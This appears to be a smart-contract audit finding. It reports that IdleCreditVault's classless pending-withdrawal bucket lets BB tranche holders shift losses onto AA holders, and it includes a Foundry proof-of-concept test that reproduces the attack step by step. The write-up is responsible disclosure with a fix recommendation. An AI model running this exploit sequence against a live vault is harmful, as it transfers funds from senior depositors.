### Title
Pending BB withdrawal receipts lose tranche seniority and socialize losses to AA holders - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`requestWithdraw` converts AA and BB tranche positions into one aggregate pending-withdrawal bucket without preserving tranche class. If a subsequent `stopEpochWithDuration` reports a loss, `previewLossAdjustedWithdrawFunds` assigns the pending bucket a pro-rata share of that loss and applies the remainder to active positions through the BB-first waterfall. A BB holder can therefore request withdrawal during the buffer period, enter an epoch that later realizes a loss equal to BB capital, and force AA holders to absorb part of the loss that should have been borne entirely by BB.

### Finding Description
`IdleCDOEpochVariant.requestWithdraw` accepts a specific tranche, but calls `IdleCreditVault.requestWithdraw` with only the underlying amount, user, and principal, without recording whether the request originated from AA or BB. [1](#0-0)  The strategy then adds every request to the same `pendingWithdraws` counter and the same per-epoch receipt mapping. [2](#0-1) 

When a loss is reported, `previewLossAdjustedWithdrawFunds` calculates `pendingLoss = _lossAmount * pendingBasis / totalBasis`; the pending pool is therefore haircut pro rata rather than ordering pending BB receipts before AA claims. [3](#0-2)  `collectWithdrawFunds` stores that uniform recovery price for every requester in the epoch. [4](#0-3)  The remaining `activeLoss` is separately burned and crystallized through the ordinary waterfall, which cannot recover the seniority already lost when the BB request entered the anonymous pending pool. [5](#0-4) 

For example, with 10,000 units of active AA and 10,000 units of pending BB, a 10,000-unit loss is split 5,000/5,000. Under BB-first accounting, the pending BB receipt should absorb the entire 10,000-unit loss and AA should remain unimpaired.

### Impact Explanation
This breaks the tranche-loss waterfall and creates a direct wealth transfer from AA holders to pending BB requesters. In the equal-capital example above, the BB requester receives 5,000 units that should have been consumed by the loss, while active AA NAV permanently decreases by the same 5,000 units. Losses can reach the full pending BB receipt basis when AA capital is also present, producing a deterministic theft or permanent impairment of senior-tranche funds.

### Likelihood Explanation
The attacker only needs to be an unprivileged BB tranche-token holder and submit `requestWithdraw` during a buffer period before an epoch in which a loss is later reported. Withdrawal requests are explicitly allowed during that phase and require no privileged participation. [6](#0-5)  The existing guards prevent another withdrawal while a loss-adjusted receipt remains open, but they do not prevent the initial BB request from joining the undifferentiated pending bucket. [7](#0-6) 

### Recommendation
Preserve tranche class in withdrawal-request accounting instead of aggregating all receipts into a classless `pendingWithdraws` bucket. `IdleCreditVault.requestWithdraw` should receive the tranche address or a seniority flag, maintain separate AA and BB pending bases per epoch, and price loss-adjusted claims BB-first across both active and pending BB exposure before applying any loss to AA. Alternatively, route loss-adjusted pending receipts through explicit per-class recovery prices and prevent class-mixing for epochs containing a realized loss.

### Proof of Concept
The following regression can be added to the existing `IdleCreditVault.t.sol` fixture, which already provides `cdoEpoch`, `strategy`, `AAtranche`, `BBtranche`, `owner`, `manager`, `borrower`, `defaultUnderlying`, and `ONE_SCALE`:

```solidity
function testPendingBBReceiptEscapesLossToAA() external {
  uint256 amount = 10_000 * ONE_SCALE;
  address aaUser = makeAddr("aaUser");
  address bbAttacker = makeAddr("bbAttacker");
  IdleCreditVault creditVault = IdleCreditVault(address(strategy));

  // Remove interest and fee noise so principal and loss accounting are exact.
  vm.prank(owner);
  cdoEpoch.setFeeParams(cdoEpoch.feeReceiver(), 0, 0, 0);
  vm.prank(manager);
  creditVault.setAprs(0, 0);
  vm.prank(owner);
  cdoEpoch.setBBDepositEnabled(true);

  // Active senior capital remains in the pool.
  deal(defaultUnderlying, aaUser, amount);
  vm.startPrank(aaUser);
  IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), amount);
  cdoEpoch.depositAA(amount);
  vm.stopPrank();

  // The attacker enters through junior BB tranches.
  deal(defaultUnderlying, bbAttacker, amount);
  vm.startPrank(bbAttacker);
  IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), amount);
  cdoEpoch.depositBB(amount);

  // During the buffer, convert the entire BB position into a pending receipt.
  uint256 bbShares = BBtranche.balanceOf(bbAttacker);
  uint256 requestEpoch = creditVault.epochNumber();
  uint256 pendingBasis = cdoEpoch.requestWithdraw(bbShares, address(BBtranche));
  vm.stopPrank();

  assertEq(pendingBasis, amount, "APR0 BB request should equal principal");

  vm.prank(manager);
  cdoEpoch.startEpoch();
  vm.warp(cdoEpoch.epochEndDate() + 1);

  // The realized loss equals the full junior receipt. Under BB-first accounting,
  // the BB receipt should recover zero and AA should remain whole.
  uint256 expectedPendingFund = amount / 2;
  deal(defaultUnderlying, borrower, expectedPendingFund);
  vm.prank(borrower);
  IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), expectedPendingFund);

  vm.prank(manager);
  cdoEpoch.stopEpochWithDuration(0, 0, 30 days, amount);

  // Actual behavior: the loss is split pro rata between active AA and pending BB.
  assertEq(creditVault.lossRecoveryPriceByEpoch(requestEpoch), 5e17);
  assertEq(cdoEpoch.lastNAVAA(), amount / 2, "AA incorrectly absorbed junior loss");

  uint256 attackerBalanceBefore = IERC20Detailed(defaultUnderlying).balanceOf(bbAttacker);
  vm.prank(bbAttacker);
  cdoEpoch.claimWithdrawRequest();

  assertEq(
    IERC20Detailed(defaultUnderlying).balanceOf(bbAttacker) - attackerBalanceBefore,
    amount / 2,
    "BB requester escaped half of a fully junior-coverable loss"
  );
}
```

The assertions quantify the broken invariant: `lossRecoveryPriceByEpoch` is `50%` even though the entire reported loss was no greater than the pending BB basis.
